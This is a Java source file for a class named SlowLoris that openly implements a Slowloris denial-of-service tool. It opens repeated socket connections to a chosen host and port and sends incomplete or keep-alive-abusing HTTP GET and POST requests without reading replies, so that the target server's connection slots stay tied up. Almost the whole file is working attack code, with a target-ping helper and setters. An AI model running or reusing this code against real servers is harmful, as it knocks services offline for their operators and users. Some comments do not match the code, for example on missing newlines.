package SlowLoris;

import java.io.*;
import java.net.InetAddress;
import java.net.Socket;
import java.util.regex.Pattern;

/**
 * Implements the actual attack code.
 */
public class SlowLoris {

    // Primitive fields
    private String netAddr;
    private String urlPath;
    private int port;
    private int numConnections;
    private boolean keepAliveAbuse;
    private boolean useGetRequest;

    // Constants
    public static final int DEFAULT_CONNECTIONS = 10;
    public static final int MAX_CONNECTIONS = 300;

    // Network connection objects
    private Socket sock;
    private BufferedReader in;
    private PrintWriter out;

    /**
     * Default constructor. Configuration:
     * netAddr: empty, will resolve to localhost
     * port: 80
     * keepAlive: will not use keep-alive connections
     */
    public SlowLoris() {
        netAddr = "";
        port = 80;
        keepAliveAbuse = false;
        setNumConnections(DEFAULT_CONNECTIONS);
    }

    /**
     * Constructor with number of connections specified.
     * @param nc The desired number of connections when attack is invoked.
     */
    public SlowLoris(int nc) {
        this();
        // Above line calls the default constructor
        if(!setNumConnections(nc)) {
            numConnections = 1;
        }
    }

    /**
     * Constructor with number of connections and URL or IP address specified.
     * @param nc The desired number of connections when attack is invoked.
     * @param addr The target URL or IP address.
     */
    public SlowLoris(int nc, String addr) {
        this(nc);
        setNetAddr(addr);
    }

    /**
     * Constructor with number of connections, URL or IP address, and port number specified.
     * @param nc The desired number of connections when attack is invoked.
     * @param addr The target URL or IP address.
     * @param port The target port number.
     */
    public SlowLoris(int nc, String addr, int port) {
        this(nc, addr);
        setPort(port);
    }

    /**
     * Launches the SlowLoris attack against the target.
     */
    public void performAttack() {
        int requestCount = 0;

        // Get a reference to the network address of the target
        InetAddress ia;
        try {
            // This actually works with both IP addresses and URLs.
            ia = InetAddress.getByName(netAddr);
        } catch(Exception e) {
            // If an exception occurs, the address must be invalid. Stop the attack.
            e.printStackTrace();
            return;
        }

        // Create dead connections
        for(int i = 0; i < numConnections; i++) {
            try {
                // Try to get a connection to the target
                System.out.println("Attempting connection to " + ia.getHostAddress());
                sock = new Socket(ia, getPort());
                out = new PrintWriter(sock.getOutputStream());
                in = new BufferedReader(new InputStreamReader(sock.getInputStream()));
            } catch (Exception e) {
                System.out.println(e);
                e.printStackTrace();
            }
            // If the connection failed, stop the attack.
            if (sock == null) {
                break;
            }

            // Otherwise, the connection is a success and we can now kill it.
            System.out.println("Successful connection #" + requestCount + "\n");
            try {
                String attack;
                // Generate either a POST or GET request.
                if(useGetRequest) {
                    // GET request
                    attack = generateAttackString();
                } else {
                    // POST request
                    attack = generatePostAttackString();
                }
                // Write the generated attack string to the server.
                if(keepAliveAbuse) {
                    // By using println, we send a complete request with the Keep-Alive header enabled.
                    // This will result in a "K" in the server-status screen on the Apache server.
                    out.println(attack);
                } else {
                    // This will result in a request that is missing a newline. The server will wait for
                    // the rest of the request to arrive, but it never will.
                    // This results in an "R" in the server-status screen on the Apache server.
                    out.print(attack);
                }
                // Flush the output to ensure that the entire request gets there.
                out.flush();

                // Note that nothing is read from the server!
                // By not reading or acknowledging the reply, we freeze the connection on the server side.

                requestCount++;
            } catch (Exception e) {
                // do nothing, just keep going.
            }
        }
        // Close the connections.
        close();
    }

    /**
     * Sends a legitimate HTTP request to the target to see if it is operational.
     * @return The HTTP response from the target or an error message.
     */
    public String pingTarget() {
        String response = "";
        try {
            // Try to get a connection to the target.
            InetAddress ia = InetAddress.getByName(netAddr);
            System.out.println("Attempting connection to " + ia.getHostAddress());
            sock = new Socket(ia, getPort());
            out = new PrintWriter(sock.getOutputStream());
            in = new BufferedReader(new InputStreamReader(sock.getInputStream()));
        } catch(Exception e) {
            // Could not connect, return an error message.
            System.out.println(e);
            e.printStackTrace();
            response = "Error during socket creation.";
            return response;
        }
        // This probably won't happen, but just in case
        if(sock == null) {
            System.out.println("Null socket.");
            response = "Error during socket creation.";
            return response;
        }

        // Successful connection, send the request.
        System.out.println("Successful connection.\n");
        try {
            // Send a legitimate request to the server.
            // Note the use of println, this will let the server know that the request is completed.
            out.println(generateAttackString());
            out.flush();
            // Read the response.
            String r = in.readLine();
            response += r + "\n";
            // Continue reading.
            while( r != null) {
                r = in.readLine();
                response += r + "\n";
            }
        } catch(Exception e) {
            // Exception is most likely to occur while writing, reading will just stall the thread if
            // it does not work.
            response = "Error writing to socket: " + e.toString();
        } finally {
            close();
        }
        // Return the response.
        return response;
    }

    /**
     * Creates an HTTP GET request with Connection: keep-alive and no ending new-line character.
     * @return A broken HTTP GET request String.
     */
    private String generateAttackString() {
        String s;
        s = "GET " + urlPath + " HTTP/1.1\n";
        s += "Host: " + netAddr + ":" + port + "\n";
        // This is the keep-alive header that makes the keep alive abuse function.
        s += "Connection: keep-alive\n";
        s += "Pragma: no-cache\n";
        s += "Cache-Control: no-cache\n";
        s += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n";
        s += "Upgrade-Insecure-Requests: 1\n";
        s += "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36\n";
        s += "Accept-Encoding: gzip, deflate, sdch\n";
        s += "Accept-Language: en-US,en;q=0.8\n";
        return s;
    }

    /**
     * Creates an HTTP POST request with Connection: keep-alive and no ending new-line character.
     * @return A broken HTTP POST request String.
     */
    private String generatePostAttackString() {
        String s;
        s = "POST " + urlPath + " HTTP/1.1\n";
        s += "Host: " + netAddr + ":" + port + "\n";
        s += "Connection: keep-alive\n";
        s += "Content-Length: 21\n";
        s += "Origin: " + netAddr + ":" + port + "\n";
        s += "Pragma: no-cache\n";
        s += "Cache-Control: no-cache\n";
        s += "Content-Type: application/x-www-form-urlencoded\n";
        s += "Referer: http://" + netAddr + ":" + port + "/\n";
        s += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n";
        s += "Upgrade-Insecure-Requests: 1\n";
        s += "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36\n";
        s += "Accept-Encoding: gzip, deflate, sdch\n";
        s += "Accept-Language: en-US,en;q=0.8\n";
        // This is where the parameters go. They don't really matter though.
        s += "Message-Body: dpt=csci&sb=Search%21\n";
        return s;
    }

    /**
     * Retrieves the number of connections that will be used on attack.
     * @return The current number of connections that will be created on attack.
     */
    public int getNumConnections() {
        return numConnections;
    }

    /**
     * Retrieves the target URL or IP address
     * @return The target URL or IP address
     */
    public String getNetAddr() {
        return netAddr;
    }

    /**
     * Retrieves whether the attack will use keep-alive connections or not.
     * @return True if keep-alive connections will be used for the attack.
     */
    public boolean isKeepAliveAbuse() {
        return keepAliveAbuse;
    }

    /**
     * Sets whether the attack will use keep-alive connections or not.
     * @param keepAliveAbuse True if keep-alive connections should be used.
     */
    public void setKeepAliveAbuse(boolean keepAliveAbuse) {
        this.keepAliveAbuse = keepAliveAbuse;
    }

    /**
     * Sets the number of connections that will be created on attack.
     * @param nc The new number of connections.
     * @return True if the number of connections was updated successfully.
     */
    public boolean setNumConnections(int nc) {
        if(nc > 0) {
            numConnections = nc;
            return true;
        } else {
            return false;
        }
    }

    /**
     * Sets the target URL or IP address
     * @param addr The new target URL or IP address
     */
    public void setNetAddr(String addr) {
        if(addr != null && !addr.trim().isEmpty()) {
            this.netAddr = addr.trim();
        } else {
            this.netAddr = "";
        }
    }

    /**
     * Sets the target port number.
     * @param port The new target port number, should be within 1 - 65565.
     */
    public void setPort(int port) {
        if(port > 1 && port < 65565) {
            this.port = port;
        } else {
            this.port = 80;
        }
    }

    /**
     * Retrieves the current target port number.
     * @return The target port number.
     */
    public int getPort() {
        return this.port;
    }

    /**
     * Sets the urlPath that will be used in the attack request.
     * @param urlPath The path used by the attack request.
     */
    public void setUrlPath(String urlPath) {
        if(urlPath != null && !urlPath.trim().isEmpty()) {
            this.urlPath = urlPath.trim();
        } else {
            this.urlPath = "/";
        }
    }

    /**
     * Retrieves the current target filepath for the attack.
     * @return The current URL used by the attack request.
     */
    public String getUrlPath() {
        return urlPath;
    }

    /**
     * Sets whether to use GET or POST requests in the attack.
     * @param useGetRequest True if GET requests should be used.
     */
    public void setUseGetRequest(boolean useGetRequest) {
        this.useGetRequest = useGetRequest;
    }

    /**
     * Retrieves whether the attack will use GET requests or not.
     * @return True if GET requests will be used in the attack.
     */
    public boolean isUseGetRequest() {
        return useGetRequest;
    }

    /**
     * Closes the socket and its related input/output streams.
     */
    public void close() {
        try {
            sock.close();
        } catch(Exception e) {
            System.out.println("close sock: " + e);
        }
        try {
            in.close();
        } catch(Exception e) {
            System.out.println("close in: " + e);
        }
        try {
            out.close();
        } catch(Exception e) {
            System.out.println("close out: " + e);
        }
    }
}
